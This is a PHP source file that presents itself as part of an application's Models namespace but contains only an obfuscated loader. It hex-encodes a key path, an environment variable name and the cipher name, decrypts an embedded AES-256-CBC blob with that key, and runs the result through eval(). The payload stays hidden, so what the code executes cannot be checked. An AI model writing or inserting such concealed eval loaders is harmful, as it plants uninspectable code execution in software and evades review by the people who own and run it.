<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7vRXMzgdkUkiXWG9gkB89A==');

$c=base64_decode(

'7uVeoe4AiKiAL58E9YWhbbr+XBgtuB8NRL3AarexvvLJ69Phe3EFQREebzQZb9CecwYzxanRyAP6' .
'T7o3cIbTnA81XXQIscjiGa4WJO12FneAKH2DrKwTULK0ioosWxZAxazQCSW6mmki6+grCD3UIKFT' .
'1fxESobYlyw3ss0NoKZyfoZN47LnfijYPcp+D+Diny5BP6I7jDXUFdAnkWVaDO9vQpQfWnkpJiuX' .
'osLB6uH3csnGs/rhkdfgb5JbdKPKnx/6hRtZ0rR4h64mCiDod0VzlRd2Gi8gvi2+bZeqekbU851K' .
'jM1E2tEiWsnQEVptZHJrcrDfhzB0knB8VaQ3tqpRNmlziPeKdVUr43kwWb/kganWZ7VvmC9yTvXh' .
'Vvu0FbrzCejC0d3Bqi4SJzYc+e9KES6bsW5gfshTHpN86B3igz0xxpAJ6aSx5pGMsZ+M++dlIN/L' .
'SsgCSkE2487dqjGCjtiv2cLnIcuGMWpoXylrn/Sxit3JkeRzD9pzTFBqUO5IcHlGgstDxW+oG1j1' .
'rlXU6paOb/8zkCeGuf3xE4JFvh01k684sBwbTTMyPxim4g8/ce3gibEYd6WafpOb15ssVFqP6YDM' .
'GAOO/UESp3nOUA8Jwp+2+vaUWAPDdVYlyxuOlKTKqItDeiRzTwnLSpBaUgBZsPkqQtiGBeP/wP6V' .
'YRG3lyBwk4ylOfxESW2QKoUkb3CzDzDwZ9MD/IkNeqvDlQ7q+BI+LvkXHoEJmMJu9WhujD0fridG' .
'2XWeIrxb/jrLWKC2hsZMGa+Qz2ulzW7v4cGJ6A1DWvgPLNCtBFXvi7mTrB28Wk5Fbi/Jx3LL4hl1' .
'U1t88URrTb29NbJGeYkwkTix2e3LMd4pyvJC9HevypC1f8KM+5mPEHC1T+8G'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

